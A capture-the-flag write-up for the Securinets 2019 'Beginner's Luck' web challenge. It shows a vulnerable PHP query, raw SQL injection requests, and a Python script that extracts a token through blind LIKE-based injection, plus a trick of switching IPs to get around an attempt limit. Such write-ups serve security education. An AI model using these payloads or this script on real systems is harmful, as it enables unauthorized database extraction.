# Securinets Prequals CTF 2019 – Beginner's Luck

* **Category:** Web
* **Points:** 989

## Challenge

> Can you help me to win the flag ? I bet you can't ..
>
> https://web4.ctfsecurinets.com
>
> [files](files)
>
> Author:Tr'GFx

## Solution

The website simulates a guessing game where the target is to guess the random token (100 chars) generated for your IP address in order to read the flag.

The challenge gives you some files with the source code.

Analyzing the source code you can discover, into `play.php`, a query vulnerable to SQL injection:

```php
$sql = "SELECT * FROM users WHERE ip='" . $_SERVER['REMOTE_ADDR'] . "' AND token='" . $_POST['val'] . "'";
$result = $conn->query($sql);
```

It can be abused with a payload like the following.

```
POST /play.php HTTP/1.1
Host: web4.ctfsecurinets.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://web4.ctfsecurinets.com/play.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Connection: close
Cookie: PHPSESSID=xxxxxxxxxxxxxxxxxxxxxxxxxx
Upgrade-Insecure-Requests: 1

val=' OR ''='
```

Nothing is printed to output as result of the query, except for different messages when the query returns rows and when no rows are returned. 

These are the prerequisites for a *blind SQL injection*. Data could be exfiltrated, one char at a time, using `LIKE` statement.

The problem is that a limit for the number of the attempts is present (max 10 attempts). At the end of the attempts, the token will be reset. So it's impossible, *from the same IP where the token was generated*, to discover the token.

The solution is obvious: you have to generate the token from one IP, then you have to change the IP to discover the previous generated token.

The query to exfiltrate data is the following.

```sql
' OR (ip='x.x.x.x' AND token LIKE '{}%') #
```

*Please consider that the specified IP must be the one for which the token was generated, not the attacking one!*

A [Python script](beginners-luck.py) can be written to discover the token.

```python
import time
import random
import os
import string
import requests

token = ""
found = len(token)
letters = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
letter_candidate = 0
payload = "val=' OR (ip='x.x.x.x' AND token LIKE '{}%') #"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
   "Content-Type": "application/x-www-form-urlencoded"
}
url_main = "https://web4.ctfsecurinets.com/"
url_index = url_main + "index.php"
url_play = url_main + "play.php"
url_reset = url_main + "reset.php"
url_start = url_main + "start.php"

global_debug = False
def debug(page, local_debug):
   if global_debug and local_debug:
      print page.status_code
      print page.headers
      print page.text

try:

   print "[*] Contacting '{}'.".format(url_reset)
   page = requests.get(url_reset, headers=headers)
   cookies = {"PHPSESSID": page.cookies["PHPSESSID"]}
   debug(page, False)
   

   while found < 100:

      print "[*] Contacting '{}'.".format(url_index)
      page = requests.get(url_index, headers=headers, cookies=cookies)
      debug(page, False)

      if "Session Expired" in page.text:
         print "[*] Session expired, contacting '{}'.".format(url_index)
         page = requests.get(url_index, headers=headers, cookies=cookies)
         debug(page, False)
      elif "Attempt" in page.text:
         letter = letters[letter_candidate]
         attempt = token + letter
         print "[*] Attempt '{}'.".format(attempt)
         data = payload.format(attempt)
         print "[*] Payload: {}.".format(data)
         page = requests.post(url_play, data=data, headers=headers, cookies=cookies)
         debug(page, False)
         
         if "True" in page.text:
            token += letter
            found += 1
            letter_candidate = 0
            print "[*] Correct letter, new token '{}'.".format(token)
         elif "Better luck next time" in page.text:
            letter_candidate = letter_candidate + 1
            print "[*] Wrong letter."         
         elif "Max Attempts Reahed" in page.text:
            print "[*] Max attempts reached, contacting '{}'.".format(url_index)
            page = requests.get(url_index, headers=headers, cookies=cookies)
            debug(page, False)
         else:
            print "[!] Something not working."
            break

      # Go to sleep.
      sleep_interval = 0
      print "[*] Sleeping {} secs.".format(sleep_interval)
      time.sleep(sleep_interval)

except KeyboardInterrupt:
   print "[-] Interrupted!"
```
*(Forgive me, but I wrote this script around 03:00 AM, so it's not the best I can do...)*

At the end the of the process, you can insert the token in the form at the following page. Be sure to use the IP for which the token was generated.

```
https://web4.ctfsecurinets.com/flag.php
```

The page will give you the flag.

```
Securinets{GG_uMadeIT_BLiIiND_M@N}
```